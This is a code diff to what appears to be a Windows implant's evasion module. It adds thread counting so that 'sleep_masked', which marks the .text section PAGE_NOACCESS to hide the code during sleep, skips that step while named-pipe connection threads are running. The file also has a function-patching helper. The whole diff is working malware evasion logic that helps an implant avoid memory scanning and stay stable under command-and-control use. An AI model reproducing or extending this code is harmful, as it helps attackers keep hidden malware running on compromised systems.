@@ -19,6 +19,13 @@ static NtDelay_t g_NtDelay = NULL;
 static void     *g_text    = NULL;
 static SIZE_T    g_tsz     = 0;
 
+/* Count of active pipe-server conn_threads. When > 0, sleep_masked skips the
+ * PAGE_NOACCESS step to avoid faulting threads executing in .text. */
+static volatile LONG g_conn_thread_count = 0;
+
+void evasion_conn_enter(void) { InterlockedIncrement(&g_conn_thread_count); }
+void evasion_conn_leave(void) { InterlockedDecrement(&g_conn_thread_count); }
+
 /* ── Startup helpers (run from .text before any sleep masking) ─────────── */
 
 static void patch_fn(const char *mod, const char *sym) {
@@ -440,6 +447,15 @@ void sleep_masked(DWORD ms) {
         LARGE_INTEGER t;
         t.QuadPart = -(LONGLONG)ms * 10000LL;
         if (g_NtDelay) g_NtDelay(FALSE, &t);
+        return;
+    }
+
+    /* Skip masking while pipe-server conn_threads are active: setting .text to
+     * PAGE_NOACCESS would fault those threads and crash the parent process. */
+    if (InterlockedOr(&g_conn_thread_count, 0) > 0) {
+        LARGE_INTEGER t;
+        t.QuadPart = -(LONGLONG)ms * 10000LL;
+        g_NtDelay(FALSE, &t);
         return;
     }
 
